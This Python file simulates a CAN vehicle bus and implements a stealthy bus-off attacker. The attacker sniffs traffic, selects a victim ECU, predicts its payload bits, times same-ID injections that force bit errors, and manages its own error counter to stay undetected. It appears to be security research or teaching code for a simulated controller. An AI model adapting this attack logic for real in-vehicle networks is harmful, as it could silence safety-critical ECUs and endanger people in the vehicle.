# General dependencies 
import threading
import time
import random
import numpy as np
from collections import Counter, defaultdict
from sklearn.ensemble import RandomForestClassifier
from sklearn.multioutput import MultiOutputClassifier
import can

# Project dependencies
from can_controller import CANBusMaster, NodeState, BitValue, CANBitStream


# --- Base ECU ---
class BaseECU:
    def __init__(self, name: str, slave_id: int, arb_id: int, master: CANBusMaster,
                 tx_period: float = 3.0, start_delay: float = 0.0):
        self.name = name
        self.slave_id = slave_id
        self.arb_id = arb_id & 0x7FF
        self.master = master
        self.tx_period = tx_period
        self.start_delay = start_delay

        self.tec = 0
        self.rec = 0
        self.state = NodeState.ERROR_ACTIVE

        self.next_tx_time = 0.0
        self._stop = False
        self._tx_thread = None

        self._counter = 0
        self.random_payload = False

        self.master.register_ecu(self)

    def start(self):
        self.next_tx_time = time.time() + self.start_delay
        self._tx_thread = threading.Thread(target=self._tx_loop, daemon=True)
        self._tx_thread.start()

    def stop(self):
        self._stop = True

    def is_bus_off(self) -> bool:
        return self.state is NodeState.BUS_OFF

    def _update_state(self):
        if self.tec >= 256:
            self.state = NodeState.BUS_OFF
        elif self.tec >= 128:
            if self.state != NodeState.ERROR_PASSIVE:
                self.state = NodeState.ERROR_PASSIVE
        else:
            self.state = NodeState.ERROR_ACTIVE

    def get_time_until_tx(self) -> float:
        return max(0.0, self.next_tx_time - time.time())

    def _build_payload(self) -> bytes:
        import random

        c = self._counter & 0xFFFF
        self._counter = (self._counter + 1) & 0xFFFF

        if not hasattr(self, "_sig_a"):
            self._sig_a = random.randint(20, 60)
        if not hasattr(self, "_sig_b"):
            self._sig_b = random.randint(80, 140)
        if not hasattr(self, "_flags"):
            self._flags = random.randint(0, 15)
        if not hasattr(self, "_alive4"):
            self._alive4 = 0

        if random.random() < 0.80:
            self._sig_a = max(0, min(255, self._sig_a + random.choice([-1, 0, 1])))
        if random.random() < 0.70:
            self._sig_b = max(0, min(255, self._sig_b + random.choice([-2, -1, 0, 1, 2])))

        if random.random() < 0.05:
            bit = 1 << random.randint(0, 3)
            self._flags ^= bit

        if (c & 0x000F) == 0:
            self._alive4 = (self._alive4 + 1) & 0x0F

        p = bytearray(8)

        p[0] = (self.arb_id >> 3) & 0xFF
        p[1] = self.arb_id & 0xFF
        p[2] = self.slave_id & 0xFF

        p[3] = self._sig_a
        p[4] = self._sig_b

        p[5] = ((self._flags & 0x0F) << 4) | (self._alive4 & 0x0F)

        p[6] = (c >> 8) & 0xFF
        p[7] = c & 0xFF

        return bytes(p)
    
    def notify_frame(self, arbitration_id: int, data: bytes):
        # frame notification from the controller - not implemented for BaseECU
        return

    def _tx_loop(self):
        while not self._stop:
            if self.is_bus_off():
                time.sleep(0.01)
                continue

            now = time.time()
            dt = self.next_tx_time - now

            if dt <= 0:
                data = self._build_payload()
                self.master.submit_transmission(self, data, self.arb_id, r0=BitValue.RECESSIVE)

                self.next_tx_time += self.tx_period
                while self.next_tx_time <= now:
                    self.next_tx_time += self.tx_period

                continue

            time.sleep(min(dt, 0.005))

# --- Attacker ECU ---
class WeepingAttacker:
    def __init__(self, master: CANBusMaster, sniff_duration_1=150, sniff_duration_2=30):
        self.name = "ATTACKER"
        self.slave_id = 999
        self.master = master
        self.sniff_duration_1 = sniff_duration_1  # 75% training
        self.sniff_duration_2 = sniff_duration_2  # 25% reinforcement

        self.tec = 0
        self.rec = 0
        self.state = NodeState.ERROR_ACTIVE

        self.running = False
        self.attack_state = "sniffing_1"  # sniffing_1, analyzing, sniffing_2, reinforcement, attacking

        # Sniffing data
        self.sniffed_data_1 = defaultdict(list)
        self.sniffed_data_2 = defaultdict(list)
        self.min_sniffed_id = None

        self.seen_ids = set()
        self.reset_id = None

        # Victim
        self.victim_id = None
        self.victim_ecu = None
        self.victim_messages = []
        self.victim_bit_probabilities = []
        self.avg_interval = None
        self.last_victim_time = None
        self.next_attack_time = None

        # --- Anti flood / anti self-collision ---
        self._last_attacked_cycle_ts = None
        self._pending_cycle_ts = None

        ## Attack params ##

        # --- R0 recessive as it is a stealth mode ---
        self.attack_r0 = BitValue.RECESSIVE

        # --- TEC management: defines TEC limits to recover from ERROR PASSIVE  ---
        self.tec_soft_limit = 72        # attack aggressiveness reduction
        self.tec_hard_limit = 88        # cooldown (pause attack)
        self.tec_target = 40            # target after cooldown
        self.max_reset_per_round = 6    # max number of frame per round to reach the target

        # --- Attacked bit randomization ---
        self.attack_topk_bits = 12        # number of considered bits
        self.attack_eps_explore = 0.20    # 20% esplorazione uniforme sui top-K
        self.attack_softmax_temp = 0.60   # temperatura softmax (più bassa = più greedy)

        self._bit_attack_counts = [0] * 64  # anti-sticking: most used bits are penalized

        self._thread = None
        self._stop = False

        self.ui_state_attacker = {
            "state": "---",
            "last_frame": "---",
        }

        self.master.register_ecu(self)

    def _log(self, message: str, is_state: bool = True):
        if is_state:
            self.ui_state_attacker["state"] = message
        else:
            self.ui_state_attacker["last_frame"] = message

    def notify_frame(self, arbitration_id: int, data: bytes):
        ts = time.time()

        # Live victim timing update
        if self.victim_id is not None and arbitration_id == self.victim_id:
            self.last_victim_time = ts

        frame_data = bytes(data)
        frame_bits = CANBitStream.bytes_to_bits(frame_data)

        if self.attack_state == "sniffing_1":
            self._log(f"almeno ci entro", False)
            self.sniffed_data_1[arbitration_id].append({
                'data': frame_data,
                'bits': frame_bits,
                'timestamp': ts
            })
            self.seen_ids.add(arbitration_id)

            if self.min_sniffed_id is None or arbitration_id < self.min_sniffed_id:
                self.min_sniffed_id = arbitration_id

            data_hex = ' '.join([f'{b:02X}' for b in frame_data])
            self._log(f"ID=0x{arbitration_id:03X} Data=[{data_hex}]", False)

        elif self.attack_state == "sniffing_2" and arbitration_id == self.victim_id:
            self.sniffed_data_2[arbitration_id].append({
                'data': frame_data,
                'bits': frame_bits,
                'timestamp': ts
            })

            data_hex = ' '.join([f'{b:02X}' for b in frame_data])
            self._log(f"ID=0x{arbitration_id:03X} Data=[{data_hex}]", False)

    def start(self):
        self.running = True
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def stop(self):
        self.running = False
        self._stop = True

    def is_bus_off(self) -> bool:
        return self.state is NodeState.BUS_OFF

    def _update_state(self):
        if self.tec >= 256:
            self.state = NodeState.BUS_OFF
            self._log(f"[ATTACKER] *** ENTERED BUS-OFF STATE *** (TEC={self.tec})")
        elif self.tec >= 128:
            if self.state != NodeState.ERROR_PASSIVE:
                self.state = NodeState.ERROR_PASSIVE
                self._log(f"[ATTACKER] Entered ERROR-PASSIVE state (TEC={self.tec})")
        else:
            self.state = NodeState.ERROR_ACTIVE

    def get_time_until_tx(self) -> float:
        if self.avg_interval == None:
            return 999
        else:
            return float(self.avg_interval)

    @property
    def arb_id(self):
        if self.attack_state == "attacking" and self.victim_id:
            return self.victim_id
        return 0x7FF

    def _run(self):
        # Phase 1: Sniffing (Training)

        self._log(f"[ATTACKER] PHASE 1: SNIFFING (Training) for {self.sniff_duration_1} seconds...")


        sniff_start = time.time()
        while time.time() - sniff_start < self.sniff_duration_1 and self.running:
            time.sleep(5)
            if len(self.sniffed_data_1) > 0:
                total_msgs = sum(len(msgs) for msgs in self.sniffed_data_1.values())
                self._log(f"[ATTACKER] Sniffed {total_msgs} messages from {len(self.sniffed_data_1)} different IDs")

        # Phase 2: Analysis

        self._log(f"[ATTACKER] PHASE 2: ANALYZING sniffed data...")


        self.attack_state = "analyzing"
        self._select_victim()

        if self.victim_id is None:
            self._log("[ATTACKER] No suitable victim found. Aborting.")
            self.running = False
            return

        if len(self.victim_messages) < 2:
            self._log(f"[ATTACKER] Not enough messages from victim (found {len(self.victim_messages)}). Aborting.")
            self.running = False
            return

        self._analyze_victim_bits()

        if not self.victim_bit_probabilities:
            self._log("[ATTACKER] Analysis failed. Aborting.")
            self.running = False
            return

        # Phase 3: Sniffing 2 (Reinforcement)

        self._log(f"[ATTACKER] PHASE 3: SNIFFING (Reinforcement) for {self.sniff_duration_2} seconds...")


        self.attack_state = "sniffing_2"
        sniff_start_2 = time.time()
        while time.time() - sniff_start_2 < self.sniff_duration_2 and self.running:
            time.sleep(2)
            if self.victim_id in self.sniffed_data_2:
                self._log(f"[ATTACKER] Collected {len(self.sniffed_data_2[self.victim_id])} reinforcement messages")

        # Phase 4: Reinforcement Learning

        self._log(f"[ATTACKER] PHASE 4: REINFORCEMENT LEARNING...")

        self.attack_state = "reinforcement"
        self._reinforcement_learning()

        # Phase 5: Attack
   
        self._log(f"[ATTACKER]  ATTACCO INIZIATO! ")
        self._log(f"[ATTACKER] Target: ID=0x{self.victim_id:03X}")
        if self.avg_interval is not None:
            self._log(f"[ATTACKER] Average interval: {self.avg_interval:.3f}s")
        self._log(f"[ATTACKER] Strategy: send SAME ID + R0=0 (dominant) to force bit-monitoring error on R0")


        self.attack_state = "attacking"
        self._attack_loop()

    def _estimate_interval(self, timestamps):
        ## Transmission interval estimation ##
        if not timestamps or len(timestamps) < 2:
            return None
        ts = sorted(timestamps)
        intervals = [ts[i+1] - ts[i] for i in range(len(ts)-1)]
        intervals = [x for x in intervals if x > 0.0005]
        if not intervals:
            return None
        med = float(np.median(intervals))
        kept = [x for x in intervals if 0.5 * med <= x <= 1.5 * med]
        if len(kept) >= 2:
            return float(np.mean(kept))
        return med

    def _select_victim(self):
        ## Victim selection ##
        if not self.sniffed_data_1:
            self._log("[ATTACKER] No data sniffed during phase 1")
            return

        self.victim_id = max(self.sniffed_data_1, key=lambda k: len(self.sniffed_data_1[k]))
        self.victim_messages = self.sniffed_data_1[self.victim_id]

        # Finds the real ECU reference
        self.victim_ecu = None
        for ecu in self.master.ecus.values():
            if getattr(ecu, 'arb_id', None) == self.victim_id and getattr(ecu, 'name', '') != self.name:
                self.victim_ecu = ecu
                break

        self._log(f"[ATTACKER] Selected victim: ID=0x{self.victim_id:03X}")
        self._log(f"[ATTACKER] Total messages: {len(self.victim_messages)}")

        # FIX timing: uses the tx_period from the CAN controller simuation
        if self.victim_ecu is not None:
            self.avg_interval = float(self.victim_ecu.tx_period)
            self.next_attack_time = float(getattr(self.victim_ecu, "next_tx_time", time.time() + self.avg_interval))
            self._log(f"[ATTACKER] Using VICTIM tx_period (ground truth): {self.avg_interval:.3f}s")
            return

        # fallback: simulated sniffing estimation
        if len(self.victim_messages) > 1:
            timestamps = [msg['timestamp'] for msg in self.victim_messages]
            self.avg_interval = self._estimate_interval(timestamps)
            self.last_victim_time = max(timestamps) if timestamps else None
            self.next_attack_time = (self.last_victim_time + self.avg_interval) if (self.last_victim_time is not None and self.avg_interval is not None) else None

            if self.avg_interval is not None:
                self._log(f"[ATTACKER] Average transmission interval: {self.avg_interval:.3f}s (robust)")
            else:
                self._log("[ATTACKER] Could not estimate interval")
        else:
            self._log(f"[ATTACKER] Only {len(self.victim_messages)} message(s) found for victim")
            self.victim_id = None

    def _analyze_victim_bits(self):
        ## Probability estimation ##
        if not self.victim_messages:
            self._log("[ATTACKER] No victim messages to analyze")
            return

        self._log(f"\n[ATTACKER] Analyzing bit patterns of victim {hex(self.victim_id)}...")

        all_bits = [msg['bits'] for msg in self.victim_messages]

        if not all(len(bits) == len(all_bits[0]) for bits in all_bits):
            self._log("[ATTACKER] Messages have different lengths, using minimum length")
            min_len = min(len(bits) for bits in all_bits)
            all_bits = [bits[:min_len] for bits in all_bits]

        num_bits = len(all_bits[0])

        self.victim_bit_probabilities = []
        for bit_pos in range(num_bits):
            bit_values = [bits[bit_pos] for bits in all_bits]
            prob_zero = sum(1 for b in bit_values if b == 0) / len(bit_values)
            prob_one = 1 - prob_zero
            self.victim_bit_probabilities.append({
                'position': bit_pos,
                'prob_0': prob_zero,
                'prob_1': prob_one
            })

        self._log(f"\n[ATTACKER] Bit probability analysis (top 10 most predictable):")
        self._log(f"{'='*80}")

        sorted_probs = sorted(
            self.victim_bit_probabilities,
            key=lambda x: max(x['prob_0'], x['prob_1']),
            reverse=True
        )

        for prob in sorted_probs[:10]:
            byte_idx = prob['position'] // 8
            bit_idx = 7 - (prob['position'] % 8)

            if prob['prob_0'] > prob['prob_1']:
                self._log(
                    f"  Bit {prob['position']:2d} (Byte {byte_idx}, Bit {bit_idx}): "
                    f"{prob['prob_0']*100:.1f}% sempre 0 (DOMINANT)"
                )
            else:
                self._log(
                    f"  Bit {prob['position']:2d} (Byte {byte_idx}, Bit {bit_idx}): "
                    f"{prob['prob_1']*100:.1f}% sempre 1 (RECESSIVE)"
                )

        self._log(f"{'='*80}\n")

    def _reinforcement_learning(self):
        ## Reinforcement phase ##
        if self.victim_id not in self.sniffed_data_2 or len(self.sniffed_data_2[self.victim_id]) == 0:
            self._log("[ATTACKER]  No reinforcement data collected. Skipping reinforcement.")
            return

        reinforcement_messages = self.sniffed_data_2[self.victim_id]

        self._log(f"[ATTACKER] Verifying predictions on {len(reinforcement_messages)} messages...")

        correct_predictions = 0
        total_bits = 0

        for msg in reinforcement_messages:
            bits = msg['bits']
            for prob in self.victim_bit_probabilities:
                pos = prob['position']
                if pos < len(bits):
                    predicted = 0 if prob['prob_0'] > prob['prob_1'] else 1
                    actual = bits[pos]
                    if predicted == actual:
                        correct_predictions += 1
                    total_bits += 1

        if total_bits > 0:
            accuracy = correct_predictions / total_bits * 100
            self._log(f"[ATTACKER] Prediction accuracy: {accuracy:.2f}%")
        else:
            self._log("[ATTACKER] No bits to verify.")

    def _wait_for_victim_transmission(self) -> bool:
        ## Needed to wait the transmitting time of the victim ##
        lead = 0.0005

        # if we have the ECU reference, use next_tx_time (ground truth) with guard-rail.
        if self.victim_ecu is not None:
            while self.running and not self.is_bus_off():
                if self.victim_ecu.is_bus_off():
                    return False

                now = time.time()
                nxt = float(getattr(self.victim_ecu, "next_tx_time", now + 0.01))
                dt = nxt - now
                cycle_ts = nxt

                # when we are in the window: time is NOT enough, we want the victim is waiting in the bus as in pending state
                if dt <= lead:
                    # anti-double attack: realistic threshold(1ms, non 1e-6)
                    if self._last_attacked_cycle_ts is not None and abs(cycle_ts - self._last_attacked_cycle_ts) < 1e-3:
                        time.sleep(0.001)
                        continue

                    # wait until victim has "enqueued" the tx
                    deadline = nxt + 0.02  # 20ms di margine
                    while self.running and time.time() < deadline and not self.is_bus_off():
                        try:
                            with self.master.lock:
                                victim_pending = any(
                                    (ecu is self.victim_ecu and arb_id == self.victim_id)
                                    for (ecu, _data, arb_id, _r0) in self.master.pending
                                )
                        except Exception:
                            victim_pending = False

                        if victim_pending:
                            self._pending_cycle_ts = cycle_ts
                            return True

                        time.sleep(0.0002)  # 0.2ms

                    # if not seen -> pending, the return
                    return False

                time.sleep(min(max(0.0, dt - lead), 0.01))
            return False

        # fallback su next_attack_time (stimata da sniffing simulato)
        if self.avg_interval is None:
            time.sleep(0.2)
            return False

        if self.last_victim_time is not None:
            self.next_attack_time = self.last_victim_time + self.avg_interval

        if self.next_attack_time is None:
            time.sleep(0.2)
            return False

        while self.running and not self.is_bus_off():
            now = time.time()
            dt = self.next_attack_time - now - lead
            if dt <= 0:
                break
            time.sleep(min(dt, 0.01))

        self.next_attack_time += self.avg_interval
        return True

    def _reduce_tec(self, num_messages: int = None):
        """
        Reduces the TEC by sending 'harmless' frames with a low ID (high priority).

        Requirements:
        - The ID must change for every frame (not always the same), while still keeping high priority (low ID).
        - 1 to 3 frames per round (if num_messages is not specified).
        - Payload must be completely random (8 independent bytes for each transmission).
        """

        if num_messages is None:
            num_messages = random.randint(1, 3)
        else:
            num_messages = int(num_messages)

        # ID to be avoided (best effort): those observed during sniffing phase + victim.
        observed = set(self.seen_ids) if self.seen_ids else set()
        if self.victim_id is not None:
            observed.add(self.victim_id)

        # High priority Id range: [0x010, upper] with upper < victim_id to get the priority.
        if self.victim_id is not None:
            upper = max(0x010, min(int(self.victim_id) - 1, 0x1FF))
        else:
            upper = 0x1FF

        # ID change for each send.
        if getattr(self, "_reset_id_cursor", None) is None:
            base = int(self.victim_id) - random.randint(1, 5) if self.victim_id is not None else 0x100
            self._reset_id_cursor = max(0x010, min(base, upper))

        def pick_next_id() -> int:
            # Pseudo-random step (1..5) and not-observed ID finding (best effort).
            for _ in range(64):
                step = random.randint(1, 5)
                cand = self._reset_id_cursor + step
                if cand > upper:
                    span = max(1, (upper - 0x010 + 1))
                    cand = 0x010 + ((cand - 0x010) % span)
                self._reset_id_cursor = cand
                if cand not in observed:
                    return cand
            return int(self._reset_id_cursor)

        # Limited bursting and doesn't steal the victim sending window
        if self.victim_ecu is not None:
            period = float(getattr(self.victim_ecu, "tx_period", 3.0))
            gap = max(0.03, min(0.20, (0.7 * period) / max(1, num_messages)))
        else:
            gap = 0.05

        for _ in range(num_messages):
            if self.victim_ecu is not None and self.victim_ecu.get_time_until_tx() <= (self.master.collect_window * 2.5 + gap):
                break

            reset_id = pick_next_id()
            reset_data = bytes(random.randint(0, 255) for _ in range(8))
            self.master.submit_transmission(self, reset_data, reset_id, r0=BitValue.RECESSIVE)
            time.sleep(gap)

    def _bits_to_bytes_msb(self, bits, nbytes=8):
        out = bytearray(nbytes)
        nb = min(len(bits), nbytes * 8)
        for pos in range(nb):
            if bits[pos]:
                b = pos // 8
                k = 7 - (pos % 8)
                out[b] |= (1 << k)
        return bytes(out)

    def _get_recent_victim_payloads(self, max_n=32):
        """
        Estrae gli ultimi max_n payload della vittima dai messaggi sniffati.
        Usa msg['data'] se c'è, altrimenti ricostruisce da msg['bits'].
        """
        msgs = []
        if hasattr(self, "victim_messages") and self.victim_messages:
            msgs = self.victim_messages
        # fallback: include reinforcement
        if hasattr(self, "sniffed_data_2") and self.victim_id in self.sniffed_data_2:
            msgs = msgs + self.sniffed_data_2[self.victim_id]

        payloads = []
        for m in msgs[-max_n:]:
            if isinstance(m, dict) and 'data' in m and m['data'] is not None:
                d = m['data']
                if isinstance(d, (bytes, bytearray)) and len(d) >= 8:
                    payloads.append(bytes(d[:8]))
                    continue
            if isinstance(m, dict) and 'bits' in m and m['bits'] is not None:
                payloads.append(self._bits_to_bytes_msb(m['bits'], nbytes=8))

        payloads = [p for p in payloads if isinstance(p, (bytes, bytearray)) and len(p) == 8]
        return payloads

    def _learn_next_payload_from_history(self, payloads):
        """
        Predict the next payload in a GENERIC way (learning):
        - if a byte has a recurring delta (mod 256), apply that delta
        - otherwise keep it equal to the last observed value
        - if a 16‑bit pair has a recurring delta (mod 65536), treat it as a 16‑bit counter
        """

        if not payloads:
            return bytes([0] * 8)

        last = payloads[-1]
        n = len(payloads)
        if n < 2:
            return bytes(last)

        # 16-bit counter finder (big endian o little endian)
        best16 = None  # (i, endian, confidence)
        for i in range(7):
            deltas_be = []
            deltas_le = []
            for t in range(1, n):
                w0_be = (payloads[t-1][i] << 8) | payloads[t-1][i+1]
                w1_be = (payloads[t][i] << 8) | payloads[t][i+1]
                deltas_be.append((w1_be - w0_be) & 0xFFFF)

                w0_le = (payloads[t-1][i+1] << 8) | payloads[t-1][i]
                w1_le = (payloads[t][i+1] << 8) | payloads[t][i]
                deltas_le.append((w1_le - w0_le) & 0xFFFF)

            c_be = Counter(deltas_be)
            c_le = Counter(deltas_le)
            (d_be, f_be) = c_be.most_common(1)[0]
            (d_le, f_le) = c_le.most_common(1)[0]
            conf_be = f_be / max(1, len(deltas_be))
            conf_le = f_le / max(1, len(deltas_le))

            if conf_be >= 0.85 and d_be in (1, 0, 0xFFFF, 2, 3):
                cand = (i, "be", conf_be, d_be)
                if best16 is None or cand[2] > best16[2]:
                    best16 = cand

            if conf_le >= 0.85 and d_le in (1, 0, 0xFFFF, 2, 3):
                cand = (i, "le", conf_le, d_le)
                if best16 is None or cand[2] > best16[2]:
                    best16 = cand

        pred = bytearray(last)

        blocked = set()
        if best16 is not None:
            i, endian, conf, delta16 = best16
            blocked.add(i)
            blocked.add(i + 1)
            if endian == "be":
                w = (last[i] << 8) | last[i+1]
                w_next = (w + delta16) & 0xFFFF
                pred[i] = (w_next >> 8) & 0xFF
                pred[i+1] = w_next & 0xFF
            else:
                w = (last[i+1] << 8) | last[i]
                w_next = (w + delta16) & 0xFFFF
                pred[i] = w_next & 0xFF
                pred[i+1] = (w_next >> 8) & 0xFF

        for j in range(8):
            if j in blocked:
                continue
            deltas = []
            for t in range(1, n):
                deltas.append((payloads[t][j] - payloads[t-1][j]) & 0xFF)
            c = Counter(deltas)
            d, f = c.most_common(1)[0]
            conf = f / max(1, len(deltas))

            if conf >= 0.85 and d in (0, 1, 0xFF, 2, 3):
                pred[j] = (last[j] + d) & 0xFF
            else:
                pred[j] = last[j]

        return bytes(pred)

    def _create_attack_message(self) -> bytes:
        import math

        probs0 = [0.5] * 64
        probs1 = [0.5] * 64
        weights = [1.0] * 64

        if self.victim_bit_probabilities:
            for d in self.victim_bit_probabilities:
                try:
                    pos = int(d.get('position', 0))
                except Exception:
                    continue
                if 0 <= pos < 64:
                    p0 = float(d.get('prob_0', 0.5))
                    p1 = float(d.get('prob_1', 0.5))
                    s = p0 + p1
                    if s > 0:
                        p0, p1 = p0 / s, p1 / s
                    probs0[pos] = max(0.0, min(1.0, p0))
                    probs1[pos] = max(0.0, min(1.0, p1))
                    try:
                        weights[pos] = max(0.01, float(d.get('weight', 1.0)))
                    except Exception:
                        weights[pos] = 1.0
        payload_hist = self._get_recent_victim_payloads(max_n=32)
        if not payload_hist:
            predicted_bits = [0 if probs0[i] >= probs1[i] else 1 for i in range(64)]
        else:
            predicted_payload = self._learn_next_payload_from_history(payload_hist)
            predicted_bits = []
            for b in range(8):
                for k in range(7, -1, -1):
                    predicted_bits.append(1 if (predicted_payload[b] >> k) & 1 else 0)
        candidates = []
        for i in range(64):
            if predicted_bits[i] == 0:
                base = probs0[i] * weights[i]
                penalty = (1.0 + self._bit_attack_counts[i]) ** 0.70
                score = base / penalty
                candidates.append((i, score))
        if not candidates:
            return bytes([0] * 8)
        candidates.sort(key=lambda x: x[1], reverse=True)
        topk = candidates[: max(1, int(self.attack_topk_bits))]

        if random.random() < float(self.attack_eps_explore):
            chosen_pos = random.choice([p for p, _ in topk])
        else:
            temp = max(1e-3, float(self.attack_softmax_temp))
            scores = [s for _, s in topk]
            mx = max(scores)
            expw = [math.exp((s - mx) / temp) for s in scores]
            tot = sum(expw)
            r = random.random() * tot
            acc = 0.0
            chosen_pos = topk[-1][0]
            for (pos, _), w in zip(topk, expw):
                acc += w
                if acc >= r:
                    chosen_pos = pos
                    break

        predicted_bits[chosen_pos] = 1
        self._bit_attack_counts[chosen_pos] += 1

        payload = bytearray(8)
        for pos in range(64):
            if predicted_bits[pos]:
                b = pos // 8
                k = 7 - (pos % 8)
                payload[b] |= (1 << k)

        return bytes(payload)

    def _attack_loop(self):
        """Loop attack with TEC handling:
        - TEC over the upper bound: NO ATTACK (cooldown), send reset frames 
        - medium TEC values: attack probability < 1 and TEC reduction
        - low TEC values: reguar attack
        """

        attack_count = 0

        while self.running and not self.is_bus_off():
            if self.victim_ecu is not None and self.victim_ecu.is_bus_off():
                return

            if self.tec >= self.tec_hard_limit:
                self._log(f"[ATTACKER]  COOLDOWN: TEC={self.tec} >= {self.tec_hard_limit}, stop attack, reducing TEC")
                while self.running and not self.is_bus_off() and self.tec > self.tec_target:
                    self._reduce_tec(num_messages=self.max_reset_per_round)
                continue

            if self.tec >= self.tec_soft_limit:
                # soft zone (attack with TEC reduction)
                if random.random() < 0.5:
                    self._reduce_tec(num_messages=self.max_reset_per_round)
                    continue

            if not self._wait_for_victim_transmission():
                continue

            if self.is_bus_off():
                return

            attack_payload = self._create_attack_message()
            self.master.submit_transmission(self, attack_payload, self.victim_id, r0=BitValue.DOMINANT)
            
            attack_count += 1
            self._last_attacked_cycle_ts = self._pending_cycle_ts or time.time()
            self._log(f"[ATTACKER] Attack #{attack_count} sent on ID=0x{self.victim_id:03X}")
